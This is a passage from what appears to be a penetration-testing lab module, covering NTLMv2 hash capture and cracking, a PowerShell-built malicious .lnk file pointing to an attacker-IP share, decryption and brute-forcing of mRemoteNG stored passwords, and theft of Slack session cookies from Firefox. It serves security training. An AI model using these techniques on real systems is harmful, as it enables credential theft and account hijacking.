    Serving HTML               [<span class="hljs-keyword">OFF</span>]
    Upstream Proxy             [<span class="hljs-keyword">OFF</span>]

[+] Poisoning Options:
    <span class="hljs-keyword">Analyze</span> <span class="hljs-keyword">Mode</span>               [<span class="hljs-keyword">OFF</span>]
    <span class="hljs-keyword">Force</span> WPAD auth            [<span class="hljs-keyword">OFF</span>]
    <span class="hljs-keyword">Force</span> Basic Auth           [<span class="hljs-keyword">OFF</span>]
    <span class="hljs-keyword">Force</span> LM <span class="hljs-keyword">downgrade</span>         [<span class="hljs-keyword">OFF</span>]
    Fingerprint <span class="hljs-keyword">hosts</span>          [<span class="hljs-keyword">ON</span>]

[+] Generic Options:
    Responder NIC              [tun2]
    Responder IP               [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.3</span>]
    Challenge <span class="hljs-keyword">set</span>              [random]
    Don<span class="hljs-string">'t Respond To Names     ['</span>ISATAP<span class="hljs-string">']



[!] Error starting SSL server on port 443, check permissions or other servers running.
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.129.43.30
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...&lt;SNIP&gt;...</span>
</code></pre>
<p><strong>Cracking NTLMv2 Hash with Hashcat</strong></p>
<p>We could then attempt to crack this password hash offline using <code>Hashcat</code> to retrieve the cleartext.</p>
<pre><code class="lang-shell-session">[!bash!]$ hashcat -m <span class="hljs-number">5600</span> hash /usr/share/wordlists/rockyou.txt

hashcat (v6<span class="hljs-number">.1</span><span class="hljs-number">.1</span>) starting...

&lt;SNIP&gt;

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: <span class="hljs-number">14344385</span>
* Bytes.....: <span class="hljs-number">139921507</span>
* Keyspace..: <span class="hljs-number">14344385</span>

ADMINISTRATOR::WINLPE-SRV01:<span class="hljs-number">815</span>c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:<span class="hljs-number">01010.</span>..&lt;SNIP&gt;...:Welcome1

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: ADMINISTRATOR::WINLPE-SRV01:<span class="hljs-number">815</span>c504e7b06ebda:afb6d3..<span class="hljs-number">.000000</span>
Time.Started.....: Thu May <span class="hljs-number">27</span> <span class="hljs-number">19</span>:<span class="hljs-number">16</span>:<span class="hljs-number">18</span> <span class="hljs-number">2021</span> (<span class="hljs-number">1</span> sec)
Time.Estimated...: Thu May <span class="hljs-number">27</span> <span class="hljs-number">19</span>:<span class="hljs-number">16</span>:<span class="hljs-number">19</span> <span class="hljs-number">2021</span> (<span class="hljs-number">0</span> secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%)
Speed.#<span class="hljs-number">1.</span>........:  <span class="hljs-number">1233.7</span> kH/s (<span class="hljs-number">2.74</span>ms) @ Accel:<span class="hljs-number">1024</span> Loops:<span class="hljs-number">1</span> Thr:<span class="hljs-number">1</span> Vec:<span class="hljs-number">8</span>
Recovered........: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests
Progress.........: <span class="hljs-number">43008</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">0.30</span>%)
Rejected.........: <span class="hljs-number">0</span>/<span class="hljs-number">43008</span> (<span class="hljs-number">0.00</span>%)
Restore.Point....: <span class="hljs-number">36864</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">0.26</span>%)
Restore.Sub.#<span class="hljs-number">1.</span>..: Salt:<span class="hljs-number">0</span> Amplifier:<span class="hljs-number">0</span><span class="hljs-number">-1</span> Iteration:<span class="hljs-number">0</span><span class="hljs-number">-1</span>
Candidates.#<span class="hljs-number">1.</span>...: holabebe -&gt; harder

Started: Thu May <span class="hljs-number">27</span> <span class="hljs-number">19</span>:<span class="hljs-number">16</span>:<span class="hljs-number">16</span> <span class="hljs-number">2021</span>
Stopped: Thu May <span class="hljs-number">27</span> <span class="hljs-number">19</span>:<span class="hljs-number">16</span>:<span class="hljs-number">20</span> <span class="hljs-number">2021</span>
</code></pre>
<p>Note: In our example, wait 2-5 minutes for the &quot;user&quot; to browse the share after starting Responder.</p>
<hr>
<h3 id="capturing-hashes-with-a-malicious-lnk-file">Capturing Hashes with a Malicious .lnk File</h3>
<p>This attack no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious <a href="https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943">.lnk</a> file. We can use various tools to generate a malicious .lnk file, such as <a href="https://github.com/dievus/lnkbomb">Lnkbomb</a>, as it is not as straightforward as creating a malicious .scf file. We can also make one using a few lines of PowerShell:</p>
<p><strong>Generating a Malicious .lnk File</strong></p>
<pre><code class="lang-powershell-session">
<span class="hljs-variable">$objShell</span> = New-Object -ComObject WScript<span class="hljs-selector-class">.Shell</span>
<span class="hljs-variable">$lnk</span> = <span class="hljs-variable">$objShell</span>.CreateShortcut(<span class="hljs-string">"C:\legit.lnk"</span>)
<span class="hljs-variable">$lnk</span><span class="hljs-selector-class">.TargetPath</span> = <span class="hljs-string">"\\&lt;attackerIP&gt;\@pwn.png"</span>
<span class="hljs-variable">$lnk</span><span class="hljs-selector-class">.WindowStyle</span> = <span class="hljs-number">1</span>
<span class="hljs-variable">$lnk</span><span class="hljs-selector-class">.IconLocation</span> = <span class="hljs-string">"%windir%\system32\shell32.dll, 3"</span>
<span class="hljs-variable">$lnk</span><span class="hljs-selector-class">.Description</span> = <span class="hljs-string">"Browsing to the directory where this file is saved will trigger an auth request."</span>
<span class="hljs-variable">$lnk</span><span class="hljs-selector-class">.HotKey</span> = <span class="hljs-string">"Ctrl+Alt+O"</span>
<span class="hljs-variable">$lnk</span>.Save()
</code></pre>
<p>Try out this technique on the target host to familiarize yourself with the methodology and add another tactic to your arsenal for when you encounter environments where Server 2019 is prevalent.</p>
<h2 id="pillaging">Pillaging</h2>
<hr>
<p>Pillaging is the process of obtaining information from a compromised system. It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details, passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.</p>
<p>These data points may help gain further access to the network or complete goals defined during the pre-engagement process of the penetration test. This data can be stored in various applications, services, and device types, which may require specific tools for us to extract.</p>
<hr>
<h3 id="data-sources">Data Sources</h3>
<p>Below are some of the sources from which we can obtain information from compromised systems:</p>
<ul>
<li>Installed applications</li>
<li>Installed services<ul>
<li>Websites</li>
<li>File Shares</li>
<li>Databases</li>
<li>Directory Services (such as Active Directory, Azure AD, etc.)</li>
<li>Name Servers</li>
<li>Deployment Services</li>
<li>Certificate Authority</li>
<li>Source Code Management Server</li>
<li>Virtualization</li>
<li>Messaging</li>
<li>Monitoring and Logging Systems</li>
<li>Backups</li>
</ul>
</li>
<li>Sensitive Data<ul>
<li>Keylogging</li>
<li>Screen Capture</li>
<li>Network Traffic Capture</li>
<li>Previous Audit reports</li>
</ul>
</li>
<li>User Information<ul>
<li>History files, interesting documents (.doc/x,.xls/x,password.<em>/pass.</em>, etc)</li>
<li>Roles and Privileges</li>
<li>Web Browsers</li>
<li>IM Clients</li>
</ul>
</li>
</ul>
<p>This is not a complete list. Anything that can provide information about our target will be valuable. Depending on the business size, purpose, and scope, we may find different information. Knowledge and familiarity with commonly used applications, server software, and middleware are essential, as most applications store their data in various formats and locations. Special tools may be necessary to obtain, extract or read the targeted data from some systems.</p>
<p>During the following sections, we will discuss and practice some aspects of Pillaging in Windows.</p>
<hr>
<h3 id="scenario">Scenario</h3>
<p>Let&#39;s assume that we have gained a foothold on the Windows server mentioned in the below network and start collecting as much information as possible.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/network.png" alt=""></p>
<hr>
<h3 id="installed-applications">Installed Applications</h3>
<p>Understanding which applications are installed on our compromised system may help us achieve our goal during a pentest. It&#39;s important to know that every pentest is different. We may encounter a lot of unknown applications on the systems we compromised. Learning and understanding how these applications connect to the business are essential to achieving our goal.</p>
<p>We will also find typical applications such as Office, remote management systems, IM clients, etc. We can use <code>dir</code> or <code>ls</code> to check the content of <code>Program Files</code> and <code>Program Files (x86)</code> to find which applications are installed. Although there may be other apps on the computer, this is a quick way to review them.</p>
<p><strong>Identifying Common Applications</strong></p>
<p>Pillaging</p>
<pre><code class="lang-cmd-session">C:\&gt;<span class="hljs-keyword">dir</span> <span class="hljs-string">"C:\Program Files"</span>
 Volume <span class="hljs-keyword">in</span> drive C has <span class="hljs-keyword">no</span> <span class="hljs-keyword">label</span>.
 Volume Serial Number is 900E-A7ED

 Directory of C:\<span class="hljs-keyword">Program</span> Files

07/14/2022  08:31 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          .
07/14/2022  08:31 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          ..
05/16/2022  03:57 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          Adobe
05/16/2022  12:33 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          Corsair
05/16/2022  10:17 AM    &lt;<span class="hljs-keyword">DIR</span>&gt;          Google
05/16/2022  11:07 AM    &lt;<span class="hljs-keyword">DIR</span>&gt;          Microsoft Office 15
07/10/2022  11:30 AM    &lt;<span class="hljs-keyword">DIR</span>&gt;          mRemoteNG
07/13/2022  09:14 AM    &lt;<span class="hljs-keyword">DIR</span>&gt;          OpenVPN
07/19/2022  09:04 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          Streamlabs OBS
07/20/2022  07:06 AM    &lt;<span class="hljs-keyword">DIR</span>&gt;          TeamViewer
               0 <span class="hljs-keyword">File</span>(s)              0 bytes
              16 <span class="hljs-keyword">Dir</span>(s)  351,524,651,008 bytes free
</code></pre>
<p>An alternative is to use PowerShell and read the Windows registry to collect more granular information about installed programs.</p>
<p><strong>Get Installed Programs via PowerShell &amp; Registry Keys</strong></p>
<p>Pillaging</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-tag">\<span class="hljs-name">htb</span></span>&gt; <span class="hljs-formula">$INSTALLED = Get-ItemProperty HKLM:<span class="hljs-tag">\<span class="hljs-name">Software</span></span><span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">CurrentVersion</span></span><span class="hljs-tag">\<span class="hljs-name">Uninstall</span></span><span class="hljs-tag">\<span class="hljs-name">*</span></span> |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:<span class="hljs-tag">\<span class="hljs-name">htb</span></span>&gt; $</span>INSTALLED += Get-ItemProperty HKLM:<span class="hljs-tag">\<span class="hljs-name">Software</span></span><span class="hljs-tag">\<span class="hljs-name">Wow</span></span>6432Node<span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">CurrentVersion</span></span><span class="hljs-tag">\<span class="hljs-name">Uninstall</span></span><span class="hljs-tag">\<span class="hljs-name">*</span></span> | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:<span class="hljs-tag">\<span class="hljs-name">htb</span></span>&gt; <span class="hljs-formula">$INSTALLED | ?{ $</span>_.DisplayName -ne <span class="hljs-formula">$null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

DisplayName                                         DisplayVersion    InstallLocation
-----------                                         --------------    ---------------
Adobe Acrobat DC (64-bit)                           22.001.20169      C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Adobe</span></span><span class="hljs-tag">\<span class="hljs-name">Acrobat</span></span> DC<span class="hljs-tag">\<span class="hljs-name">
</span></span>CORSAIR iCUE 4 Software                             4.23.137          C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Corsair</span></span><span class="hljs-tag">\<span class="hljs-name">CORSAIR</span></span> iCUE 4 Software
Google Chrome                                       103.0.5060.134    C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Google</span></span><span class="hljs-tag">\<span class="hljs-name">Chrome</span></span><span class="hljs-tag">\<span class="hljs-name">Application</span></span>
Google Drive                                        60.0.2.0          C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">Google</span></span><span class="hljs-tag">\<span class="hljs-name">Drive</span></span> File Stream<span class="hljs-tag">\</span>60.0.2.0<span class="hljs-tag">\<span class="hljs-name">GoogleDriveFS</span></span>.exe
Microsoft Office Profesional Plus 2016 - es-es      16.0.15330.20264  C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files (x86)<span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span> Office
Microsoft Office Professional Plus 2016 - en-us     16.0.15330.20264  C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files (x86)<span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span> Office
mRemoteNG                                           1.62              C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">mRemoteNG</span></span>
TeamViewer                                          15.31.5           C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">TeamViewer</span></span>
...SNIP...</span>
</code></pre>
<p>We can see the <code>mRemoteNG</code> software is installed on the system. <a href="https://mremoteng.org/">mRemoteNG</a> is a tool used to manage and connect to remote systems using VNC, RDP, SSH, and similar protocols. Let&#39;s take a look at <code>mRemoteNG</code>.</p>
<p><strong>mRemoteNG</strong></p>
<p><code>mRemoteNG</code> saves connection info and credentials to a file called <code>confCons.xml</code>. They use a hardcoded master password, <code>mR3m</code>, so if anyone starts saving credentials in <code>mRemoteNG</code> and does not protect the configuration with a password, we can access the credentials from the configuration file and decrypt them.</p>
<p>By default, the configuration file is located in <code>%USERPROFILE%\APPDATA\Roaming\mRemoteNG</code>.</p>
<p><strong>Discover mRemoteNG Configuration Files</strong></p>
<p>Pillaging</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; ls C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\j</span>ulio<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\R</span>oaming<span class="hljs-symbol">\m</span>RemoteNG

    Directory: C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\j</span>ulio<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\R</span>oaming<span class="hljs-symbol">\m</span>RemoteNG

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/21/2022   8:51 AM                Themes
-a----        7/21/2022   8:51 AM            340 confCons.xml
              7/21/2022   8:51 AM            970 mRemoteNG.log
</code></pre>
<p>Let&#39;s look at the contents of the <code>confCons.xml</code> file.</p>
<p><strong>mRemoteNG Configuration File - confCons.xml</strong></p>
<p>Code: xml</p>
<pre><code class="lang-xml"><span class="xml"><span class="php"><span class="hljs-meta">&lt;?</span>XML version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">mrng:Connections</span> <span class="hljs-attr">xmlns:mrng</span>=<span class="hljs-string">"http://mremoteng.org"</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"Connections"</span> <span class="hljs-attr">Export</span>=<span class="hljs-string">"false"</span> <span class="hljs-attr">EncryptionEngine</span>=<span class="hljs-string">"AES"</span> <span class="hljs-attr">BlockCipherMode</span>=<span class="hljs-string">"GCM"</span> <span class="hljs-attr">KdfIterations</span>=<span class="hljs-string">"1000"</span> <span class="hljs-attr">FullFileEncryption</span>=<span class="hljs-string">"false"</span> <span class="hljs-attr">Protected</span>=<span class="hljs-string">"QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe"</span> <span class="hljs-attr">ConfVersion</span>=<span class="hljs-string">"2.6"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">Node</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"RDP_Domain"</span> <span class="hljs-attr">Type</span>=<span class="hljs-string">"Connection"</span> <span class="hljs-attr">Descr</span>=<span class="hljs-string">""</span> <span class="hljs-attr">Icon</span>=<span class="hljs-string">"mRemoteNG"</span> <span class="hljs-attr">Panel</span>=<span class="hljs-string">"General"</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">"096332c1-f405-4e1e-90e0-fd2a170beeb5"</span> <span class="hljs-attr">Username</span>=<span class="hljs-string">"administrator"</span> <span class="hljs-attr">Domain</span>=<span class="hljs-string">"test.local"</span> <span class="hljs-attr">Password</span>=<span class="hljs-string">"sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig=="</span> <span class="hljs-attr">Hostname</span>=<span class="hljs-string">"10.0.0.10"</span> <span class="hljs-attr">Protocol</span>=<span class="hljs-string">"RDP"</span> <span class="hljs-attr">PuttySession</span>=<span class="hljs-string">"Default Settings"</span> <span class="hljs-attr">Port</span>=<span class="hljs-string">"3389"</span>
    <span class="hljs-attr">..SNIP..</span>
&lt;/<span class="hljs-attr">Connections</span>&gt;</span></span>
</code></pre>
<p>This XML document contains a root element called <code>Connections</code> with the information about the encryption used for the credentials and the attribute <code>Protected</code>, which corresponds to the master password used to encrypt the document. We can use this string to attempt to crack the master password. We will find some elements named <code>Node</code> within the root element. Those nodes contain details about the remote system, such as username, domain, hostname, protocol, and password. All fields are plaintext except the password, which is encrypted with the master password.</p>
<p>As mentioned previously, if the user didn&#39;t set a custom master password, we can use the script <a href="https://github.com/haseebT/mRemoteNG-Decrypt">mRemoteNG-Decrypt</a> to decrypt the password. We need to copy the attribute <code>Password</code> content and use it with the option <code>-s</code>. If there&#39;s a master password and we know it, we can then use the option <code>-p</code> with the custom master password to also decrypt the password.</p>
<p><strong>Decrypt the Password with mremoteng_decrypt</strong></p>
<p>Pillaging</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ python3 mremoteng_decrypt.py -s <span class="hljs-string">"sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig=="</span> 

Password: ASDki230kasd09fk233aDA
</code></pre>
<p>Now let&#39;s look at an encrypted configuration file with a custom password. For this example, we set the custom password <code>admin</code>.</p>
<p><strong>mRemoteNG Configuration File - confCons.xml</strong></p>
<p>Code: xml</p>
<pre><code class="lang-xml"><span class="xml"><span class="php"><span class="hljs-meta">&lt;?</span>XML version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">mrng:Connections</span> <span class="hljs-attr">xmlns:mrng</span>=<span class="hljs-string">"http://mremoteng.org"</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"Connections"</span> <span class="hljs-attr">Export</span>=<span class="hljs-string">"false"</span> <span class="hljs-attr">EncryptionEngine</span>=<span class="hljs-string">"AES"</span> <span class="hljs-attr">BlockCipherMode</span>=<span class="hljs-string">"GCM"</span> <span class="hljs-attr">KdfIterations</span>=<span class="hljs-string">"1000"</span> <span class="hljs-attr">FullFileEncryption</span>=<span class="hljs-string">"false"</span> <span class="hljs-attr">Protected</span>=<span class="hljs-string">"1ZR9DpX3eXumopcnjhTQ7e78u+SXqyxDmv2jebJg09pg55kBFW+wK1e5bvsRshxuZ7yvteMgmfMW5eUzU4NG"</span> <span class="hljs-attr">ConfVersion</span>=<span class="hljs-string">"2.6"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">Node</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"RDP_Domain"</span> <span class="hljs-attr">Type</span>=<span class="hljs-string">"Connection"</span> <span class="hljs-attr">Descr</span>=<span class="hljs-string">""</span> <span class="hljs-attr">Icon</span>=<span class="hljs-string">"mRemoteNG"</span> <span class="hljs-attr">Panel</span>=<span class="hljs-string">"General"</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">"096332c1-f405-4e1e-90e0-fd2a170beeb5"</span> <span class="hljs-attr">Username</span>=<span class="hljs-string">"administrator"</span> <span class="hljs-attr">Domain</span>=<span class="hljs-string">"test.local"</span> <span class="hljs-attr">Password</span>=<span class="hljs-string">"EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="</span> <span class="hljs-attr">Hostname</span>=<span class="hljs-string">"10.0.0.10"</span> <span class="hljs-attr">Protocol</span>=<span class="hljs-string">"RDP"</span> <span class="hljs-attr">PuttySession</span>=<span class="hljs-string">"Default Settings"</span> <span class="hljs-attr">Port</span>=<span class="hljs-string">"3389"</span> <span class="hljs-attr">ConnectToConsole</span>=<span class="hljs-string">"False"</span> 

&lt;<span class="hljs-attr">SNIP</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">Connections</span>&gt;</span></span>
</code></pre>
<p>If we attempt to decrypt the <code>Password</code> attribute from the node <code>RDP_Domain</code>, we will get the following error.</p>
<p><strong>Attempt to Decrypt the Password with a Custom Password</strong></p>
<p>Pillaging</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="

Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):
  <span class="hljs-keyword">File</span> <span class="hljs-string">"/home/plaintext/htb/academy/mremoteng_decrypt.py"</span>, line <span class="hljs-number">49</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;
    <span class="hljs-keyword">main</span>()
  <span class="hljs-keyword">File</span> <span class="hljs-string">"/home/plaintext/htb/academy/mremoteng_decrypt.py"</span>, line <span class="hljs-number">45</span>, <span class="hljs-keyword">in</span> <span class="hljs-keyword">main</span>
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
  <span class="hljs-keyword">File</span> <span class="hljs-string">"/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py"</span>, line <span class="hljs-number">567</span>, <span class="hljs-keyword">in</span> decrypt_and_verify
    self.verify(received_mac_tag)
  <span class="hljs-keyword">File</span> <span class="hljs-string">"/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py"</span>, line <span class="hljs-number">508</span>, <span class="hljs-keyword">in</span> <span class="hljs-keyword">verify</span>
    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"MAC check failed"</span>)
ValueError: MAC <span class="hljs-keyword">check</span> <span class="hljs-keyword">failed</span>
</code></pre>
<p>If we use the custom password, we can decrypt it.</p>
<p><strong>Decrypt the Password with mremoteng_decrypt and a Custom Password</strong></p>
<p>Pillaging</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python3 mremoteng_decrypt<span class="hljs-selector-class">.py</span> -s <span class="hljs-string">"EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="</span> -<span class="hljs-selector-tag">p</span> admin

Password: ASDki230kasd09fk233aDA
</code></pre>
<p>In case we want to attempt to crack the password, we can modify the script to try multiple passwords from a file, or we can create a Bash <code>for loop</code>. We can attempt to crack the <code>Protected</code> attribute or the <code>Password</code> itself. If we try to crack the <code>Protected</code> attribute once we find the correct password, the result will be <code>Password: ThisIsProtected</code>. If we try to crack the <code>Password</code> directly, the result will be <code>Password: &lt;PASSWORD&gt;</code>.</p>
<p><strong>For Loop to Crack the Master Password with mremoteng_decrypt</strong></p>
<p>Pillaging</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> $(cat /usr/share/wordlists/fasttrack.txt);<span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$password</span>; python3 mremoteng_decrypt.py <span class="hljs-_">-s</span> <span class="hljs-string">"EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="</span> -p <span class="hljs-variable">$password</span> 2&gt;/dev/null;<span class="hljs-keyword">done</span>    

Spring2017
Spring2016
admin
Password: ASDki230kasd09fk233aDA
admin admin          
admins

&lt;SNIP&gt;
</code></pre>
<hr>
<h3 id="abusing-cookies-to-get-access-to-im-clients">Abusing Cookies to Get Access to IM Clients</h3>
<p>With the ability to instantaneously send messages between co-workers and teams, instant messaging (IM) applications like <code>Slack</code> and <code>Microsoft Teams</code> have become staples of modern office communications. These applications help in improving collaboration between co-workers and teams. If we compromise a user account and gain access to an IM Client, we can look for information in private chats and groups.</p>
<p>There are multiple options to gain access to an IM Client; one standard method is to use the user&#39;s credentials to get into the cloud version of the instant messaging application as the regular user would.</p>
<p>If the user is using any form of multi-factor authentication, or we can&#39;t get the user&#39;s plaintext credentials, we can try to steal the user&#39;s cookies to log in to the cloud-based client.</p>
<p>There are often tools that may help us automate the process, but as the cloud and applications constantly evolve, we may find these applications out of date, and we still need to find a way to gather information from the IM clients. Understanding how to abuse credentials, cookies, and tokens is often helpful in accessing web applications such as IM Clients.</p>
<p>Let&#39;s use <code>Slack</code> as an example. Multiple posts refer to how to abuse <code>Slack</code> such as <a href="https://posts.specterops.io/abusing-slack-for-offensive-operations-2343237b9282">Abusing Slack for Offensive Operations</a> and <a href="https://thomfre.dev/post/2021/phishing-for-slack-tokens/">Phishing for Slack-tokens</a>. We can use them to understand better how Slack tokens and cookies work, but keep in mind that <code>Slack&#39;s</code> behavior may have changed since the release of those posts.</p>
<p>There&#39;s also a tool called <a href="https://github.com/clr2of8/SlackExtract">SlackExtract</a> released in 2018, which was able to extract <code>Slack</code> messages. Their research discusses the cookie named <code>d</code>, which <code>Slack</code> uses to store the user&#39;s authentication token. If we can get our hands on that cookie, we will be able to authenticate as the user. Instead of using the tool, we will attempt to obtain the cookie from Firefox or a Chromium-based browser and authenticate as the user.</p>
<p><strong>Cookie Extraction from Firefox</strong></p>
<p>Firefox saves the cookies in an SQLite database in a file named <code>cookies.sqlite</code>. This file is in each user&#39;s APPDATA directory <code>%APPDATA%\Mozilla\Firefox\Profiles\&lt;RANDOM&gt;.default-release</code>. There&#39;s a piece of the file that is random, and we can use a wildcard in PowerShell to copy the file content.</p>
<p><strong>Copy Firefox Cookies Database</strong></p>
<p>Pillaging</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-tag">\<span class="hljs-name">htb</span></span>&gt; copy <span class="hljs-formula">$env:APPDATA<span class="hljs-tag">\<span class="hljs-name">Mozilla</span></span><span class="hljs-tag">\<span class="hljs-name">Firefox</span></span><span class="hljs-tag">\<span class="hljs-name">Profiles</span></span><span class="hljs-tag">\<span class="hljs-name">*</span></span>.default-release<span class="hljs-tag">\<span class="hljs-name">cookies</span></span>.sqlite .</span>
</code></pre>
<p>We can copy the file to our machine and use the Python script <a href="https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py">cookieextractor.py</a> to extract cookies from the Firefox cookies.SQLite database.</p>
<p><strong>Extract Slack Cookie from Firefox Cookies Database</strong></p>
<p>Pillaging</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python3 cookieextractor.py --dbpath <span class="hljs-string">"/home/plaintext/cookies.sqlite"</span> --host slack --cookie d

(<span class="hljs-number">201</span>, '', 'd', 'xoxd-CJRafjAvR3UcF%<span class="hljs-number">2</span>FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%<span class="hljs-number">2</span>FldpLjiPQoz0OXAwS0%<span class="hljs-number">2</span>FyqK5S8bw2Hz%<span class="hljs-number">2</span>FlW1AbZQ%<span class="hljs-number">2</span>Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%<span class="hljs-number">2</span>Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D', '.slack.com', '/', <span class="hljs-number">1974391707</span>, <span class="hljs-number">1659379143849000</span>, <span class="hljs-number">1658439420528000</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)
</code></pre>
<p>Now that we have the cookie, we can use any browser extension to add the cookie to our browser. For this example, we will use Firefox and the extension <a href="https://cookie-editor.cgagnier.ca/">Cookie-Editor</a>. Make sure to install the extension by clicking the link, selecting your browser, and adding the extension. Once the extension is installed, you will see something like this:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/cookie-editor-extension.jpg" alt="text"></p>
